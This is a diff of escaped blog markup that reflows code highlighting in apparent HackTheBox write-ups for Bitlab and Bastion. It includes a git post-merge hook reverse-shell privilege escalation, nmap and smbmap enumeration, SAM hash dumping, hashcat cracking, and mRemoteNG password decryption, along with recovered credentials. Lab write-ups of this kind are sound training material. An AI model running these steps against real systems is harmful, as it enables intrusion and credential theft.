+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_query&lt;/span>($db, $sql);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#f92672">!&lt;/span>$ret) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">pg_last_error&lt;/span>($db);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">exit&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span>($row &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">pg_fetch_row&lt;/span>($ret)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span> $row[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Operation done successfully&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">pg_close&lt;/span>($db);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the db I found a password which appears to be base64 encoded but the trick was to use it as it is and not decode it for it to work.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-15.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;h2 id="getting-root">Getting Root&lt;/h2>
 &lt;p>This part was interesting as I had never heard of this technique before. The user www-data had sudo rights to run git pull.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-16.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>In git there are scripts called git hooks which can run automatically before or after git actions like commits. You can configure them in .git/hooks. For this case I&amp;rsquo;ll use &lt;strong>post-merge&lt;/strong> since when git pull is run a merge action is done.&lt;/p>
 &lt;p>Since we can&amp;rsquo;t edit the current folder copy the profile repo to a world writeable directory like /tmp and create the post-merge script in hooks, the script will give a reverse shell.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">cp -r /var/www/html/profile /tmp
-&lt;/code>&lt;/pre>&lt;/div>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>cp -r /var/www/html/profile /tmp
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-17.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
 &lt;p>After making this file executable, we just have to make any change to the repo on the gitlab instance like creating a txt file and make sure we merge it to master. Once that is done, we can run sudo git pull and get a root reverse shell.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bitlab/bitlab-18.png" alt="gitlab instance" class="center" style="border-radius: 8px;" />
@@ -369,76 +395,81 @@ $ret &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">p
 &lt;p>Bastion was a relatively easy box. There is an smb share is accessible without credentials and inside there is a backup drive that we can mount and access. From the drive we can dump the SAM file and crack it to get login credentials. Once logged in we find mRemoteNG installed and extract its saved passwords to get admin access.&lt;/p>
 &lt;h1 id="enumeration">Enumeration&lt;/h1>
 &lt;p>I start with this nmap command to quickly find open ports.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.134
-Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.23s latency&lt;span style="color:#f92672">)&lt;/span>.
-Not shown: &lt;span style="color:#ae81ff">65522&lt;/span> closed ports
-PORT STATE SERVICE
-22/tcp open ssh
-135/tcp open msrpc
-139/tcp open netbios-ssn
-445/tcp open microsoft-ds
-5985/tcp open wsman
-47001/tcp open winrm
-49664/tcp open unknown
-49665/tcp open unknown
-49666/tcp open unknown
-49667/tcp open unknown
-49668/tcp open unknown
-49669/tcp open unknown
-49670/tcp open unknown
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run a thorough service scan on the discovered ports.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134
-Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
-Host is up &lt;span style="color:#f92672">(&lt;/span>0.22s latency&lt;span style="color:#f92672">)&lt;/span>.
-PORT STATE SERVICE VERSION
-22/tcp open ssh OpenSSH for_Windows_7.9 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
-| ssh-hostkey:
-| &lt;span style="color:#ae81ff">2048&lt;/span> 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
-| &lt;span style="color:#ae81ff">256&lt;/span> cc:2e:56🆎19:97:d5:bb:03:fb:82💿63:da:68:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
-|_ &lt;span style="color:#ae81ff">256&lt;/span> 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
-135/tcp open msrpc Microsoft Windows RPC
-139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds
-5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-Service Info: OSs: Windows, Windows Server &lt;span style="color:#ae81ff">2008&lt;/span> R2 - 2012; CPE: cpe:/o:microsoft:windows
-Host script results:
-|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
-| smb-os-discovery:
-| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
-| Computer name: Bastion
-| NetBIOS computer name: BASTION&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
-| Workgroup: WORKGROUP&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
-|_ System time: 2019-09-06T13:28:45+02:00
-| smb-security-mode:
-| account_used: guest
-| authentication_level: user
-| challenge_response: supported
-|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
-| smb2-security-mode:
-| 2.02:
-|_ Message signing enabled but not required
-| smb2-time:
-| date: 2019-09-06 12:28:49
-|_ start_date: 2019-09-06 11:58:13
-&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smb">SMB&lt;/h2>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -sS -p- --min-rate&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1000&lt;/span> 10.10.10.134
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.23s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not shown: &lt;span style="color:#ae81ff">65522&lt;/span> closed ports
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>135/tcp open msrpc
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open microsoft-ds
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5985/tcp open wsman
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>47001/tcp open winrm
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49664/tcp open unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49665/tcp open unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49666/tcp open unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49667/tcp open unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49668/tcp open unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49669/tcp open unknown
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>49670/tcp open unknown
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Then run a thorough service scan on the discovered ports.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>nmap -sC -sV -p 22,135,139,445,5985,47001 -oA nmap/bastion 10.10.10.134
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Nmap scan report &lt;span style="color:#66d9ef">for&lt;/span> 10.10.10.134
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host is up &lt;span style="color:#f92672">(&lt;/span>0.22s latency&lt;span style="color:#f92672">)&lt;/span>.
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PORT STATE SERVICE VERSION
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>22/tcp open ssh OpenSSH for_Windows_7.9 &lt;span style="color:#f92672">(&lt;/span>protocol 2.0&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| ssh-hostkey:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2048&lt;/span> 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a &lt;span style="color:#f92672">(&lt;/span>RSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">256&lt;/span> cc:2e:56🆎19:97:d5:bb:03:fb:82💿63:da:68:01 &lt;span style="color:#f92672">(&lt;/span>ECDSA&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ &lt;span style="color:#ae81ff">256&lt;/span> 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 &lt;span style="color:#f92672">(&lt;/span>ED25519&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>135/tcp open msrpc Microsoft Windows RPC
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>139/tcp open netbios-ssn Microsoft Windows netbios-ssn
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>445/tcp open microsoft-ds Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> microsoft-ds
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>5985/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>47001/tcp open http Microsoft HTTPAPI httpd 2.0 &lt;span style="color:#f92672">(&lt;/span>SSDP/UPnP&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_http-title: Not Found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Service Info: OSs: Windows, Windows Server &lt;span style="color:#ae81ff">2008&lt;/span> R2 - 2012; CPE: cpe:/o:microsoft:windows
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Host script results:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_clock-skew: mean: -42m39s, deviation: 1h09m15s, median: -2m40s
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-os-discovery:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| OS: Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard &lt;span style="color:#ae81ff">14393&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Windows Server &lt;span style="color:#ae81ff">2016&lt;/span> Standard 6.3&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Computer name: Bastion
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| NetBIOS computer name: BASTION&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| Workgroup: WORKGROUP&lt;span style="color:#ae81ff">\x&lt;/span>&lt;span style="color:#ae81ff">00&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ System time: 2019-09-06T13:28:45+02:00
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| account_used: guest
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| authentication_level: user
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| challenge_response: supported
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ message_signing: disabled &lt;span style="color:#f92672">(&lt;/span>dangerous, but default&lt;span style="color:#f92672">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-security-mode:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| 2.02:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ Message signing enabled but not required
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| smb2-time:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| date: 2019-09-06 12:28:49
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>|_ start_date: 2019-09-06 11:58:13
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="smb">SMB&lt;/h2>
 &lt;p>Based on the open ports the best service to check out first is smb.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">smbmap -H 10.10.10.134 -u &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>
-&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Finding open SMB ports....
-&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Guest SMB session established on 10.10.10.134...
-&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> IP: 10.10.10.134:445 Name: 10.10.10.134
-Disk Permissions
----- -----------
-ADMIN$ NO ACCESS
-Backups READ, WRITE
-C$ NO ACCESS
-IPC$ READ ONLY
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>smbmap -H 10.10.10.134 -u &lt;span style="color:#e6db74">&amp;#39; &amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Finding open SMB ports....
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> Guest SMB session established on 10.10.10.134...
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>+&lt;span style="color:#f92672">]&lt;/span> IP: 10.10.10.134:445 Name: 10.10.10.134
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Disk Permissions
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ---- -----------
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ADMIN$ NO ACCESS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Backups READ, WRITE
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> C$ NO ACCESS
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> IPC$ READ ONLY
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After running smbmap, I discover a share called Backups that I have read and write permissions as a guest user.&lt;/p>
 &lt;p>Since this is a windows machine I will switch to my windows vm to make my work easier.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bastion/backup_share.png" alt="backup share" class="center" style="border-radius: 8px;" />
 &lt;!-- raw HTML omitted -->
@@ -454,14 +485,16 @@ IPC$ READ ONLY
 &lt;img src="https://blog.ikuamike.io/img/bastion/backup_share_4.png" alt="backup share" class="center" style="border-radius: 8px;" />
 &lt;h5 id="now-to-get-the-credentials">Now to get the credentials!&lt;/h5>
 &lt;p>I pulled the 2 files back to my kali box and using samdump2 I got the user hash.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">samdump2 SYSTEM SAM
-*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
-L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then cracked the NTLM hash for L4mpje using hashcat and got the password.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">hashcat -m &lt;span style="color:#ae81ff">1000&lt;/span> -a &lt;span style="color:#ae81ff">0&lt;/span> 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force
-26112010952d963c8dc4217daec986d9:bureaulampje
-&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="exploitation">Exploitation&lt;/h1>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>samdump2 SYSTEM SAM
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I then cracked the NTLM hash for L4mpje using hashcat and got the password.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>hashcat -m &lt;span style="color:#ae81ff">1000&lt;/span> -a &lt;span style="color:#ae81ff">0&lt;/span> 26112010952d963c8dc4217daec986d9 /usr/share/wordlists/rockyou.txt --force
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>26112010952d963c8dc4217daec986d9:bureaulampje
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="exploitation">Exploitation&lt;/h1>
 &lt;p>Now that I have a username and password I can login through ssh.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bastion/bastion_5.png" alt="backup share" class="center" style="border-radius: 8px;" />
 &lt;p>Now that user is owned, let&amp;rsquo;s try to escalate privileges to admin.&lt;/p>
@@ -474,9 +507,10 @@ L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 &lt;p>The saved passwords are located in AppData in mRemoteNG\confCons.xml. Once I found the file the admin password was there but encrypted.&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bastion/bastion_7.png" alt="backup share" class="center" style="border-radius: 8px;" />
 &lt;p>I was able to find a script on github to decrypt the password.&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&lt;span style="color:#f92672">==&lt;/span>
-Password: thXLHM96BeKL0ER2
-&lt;/code>&lt;/pre>&lt;/div>&lt;p>I can finally login as administrator and own system!&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>./mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw&lt;span style="color:#f92672">==&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Password: thXLHM96BeKL0ER2
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I can finally login as administrator and own system!&lt;/p>
 &lt;img src="https://blog.ikuamike.io/img/bastion/bastion_8.png" alt="backup share" class="center" style="border-radius: 8px;" />
 &lt;h1 id="references">References&lt;/h1>
 &lt;ul>
